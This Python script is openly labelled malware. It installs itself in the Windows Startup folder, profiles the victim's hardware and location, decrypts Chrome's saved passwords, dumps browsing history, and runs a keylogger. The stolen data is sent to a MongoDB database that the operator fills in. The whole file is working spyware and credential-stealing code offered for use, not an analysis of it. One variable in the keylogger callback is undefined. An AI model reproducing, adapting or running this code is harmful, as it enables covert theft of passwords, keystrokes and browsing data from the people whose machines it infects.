import os
import sys
import wmi
import json
import base64
import socket
import psutil
import requests
import platform
import win32crypt
from Cryptodome.Cipher import AES
import sqlite3
import shutil
import subprocess
from pynput import keyboard
from pynput.keyboard import Key
from pymongo import MongoClient
from datetime import timezone, datetime, timedelta

cluster = MongoClient() #your database here

#copy file for autostart
def copy_to_startup():
    current_path = os.path.realpath(__file__)
    current_file = os.path.basename(current_path)
    startup_path = os.path.join(os.environ["USERPROFILE"], "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    if not os.path.exists(os.path.join(startup_path, current_file)):
        shutil.copy2(current_path, startup_path)
        print("Script copied to startup folder successfully!")
    else:
        print("Script already in startup folder.")

#computer information and network
def recon():
    db = cluster["keyloger"]
    collection = db["devices"]
    computer_name = platform.node()
    os = platform.system()
    os_version = platform.release()
    c = wmi.WMI()
    for cpu in c.Win32_Processor():
        print(f'CPU Name: {cpu.Name}')
    for gpu in c.Win32_VideoController():
        print(f'GPU Name: {gpu.Name}')
    for disk in c.Win32_DiskDrive():
        print(f'Disk Name: {disk.Caption}')
        total_space = int(disk.Size)
    ram = psutil.virtual_memory()
    print(f'Total RAM: {ram.total / (1024 ** 3):.2f} GB')
    response = requests.get("https://api.ipify.org")
    public_ip = response.text
    ip_info = requests.get(f"https://ipapi.co/{public_ip}/json/").json()
    country = ip_info['country_name']
    city = ip_info["city"]
    organization = ip_info["org"]
    post = {"Device": computer_name, "Operating system": os+" "+os_version, "Cpu": cpu.Name, "Gpu": gpu.Name, "Drive name": disk.Caption, "Drive size": f'{total_space / (1024 ** 3):.2f} GB', "Ram": f'{ram.total / (1024 ** 3):.2f} GB', "Public ip": public_ip, "Country": country, "City": city, "Provider": organization}
    collection.insert_one(post)

#password extractor
def fetching_encryption_key():
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
      
    encryption_key = encryption_key[5:]
    
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def main():
    print("Extracting passwords")
    db = cluster["keyloger"]
    collection = db["devices_passwords_logins"]
    
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
      
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
    "order by date_last_used")
      
    for row in cursor.fetchall():
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            post = {"login Url":login_page_url, "Username": user_name, "Password":decrypted_password}
            collection.insert_one(post)
          
        else:
            continue
    cursor.close()
    db.close()
      
    try:
        os.remove(filename)
    except:
        pass

#history extractor
def user_history_data():
    print("Extracting history data")
    db = cluster["keyloger"]
    collection = db["devices_history"]

    path = r"\AppData\Local\Google\Chrome\User Data\Default"

    os.chdir(os.path.join(os.environ["USERPROFILE"] + path))
    con = sqlite3.connect("History")
    cursor = con.cursor()

    for i in cursor.execute("SELECT * from urls"):
        post = {"website name": i[2], "website url": i[1]}
        collection.insert_one(post)
    print("Running keyloger")

#keylogs
keys = []

def on_press(key):
    global keys, host_name
    db = cluster["keyloger"]
    collection = db["devices"]
    keys.append(key)
    if key == Key.enter:
        data = str(keys).replace("'","").replace(",","").replace("[","").replace("]","").replace("<Key.space:  >"," ").replace("<Key.enter: <13>>","").replace("<Key.shift: <160>>", "")
        post = {"device": str(host_name), "text log": data}
        collection.insert_one(post)
        keys = []

def on_release(key):
    if key == keyboard.Key.esc:
        return False

#calling malware functions
copy_to_startup()
recon()
main()
user_history_data()
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
listener = keyboard.Listener(on_press=on_press,on_release=on_release)
listener.start()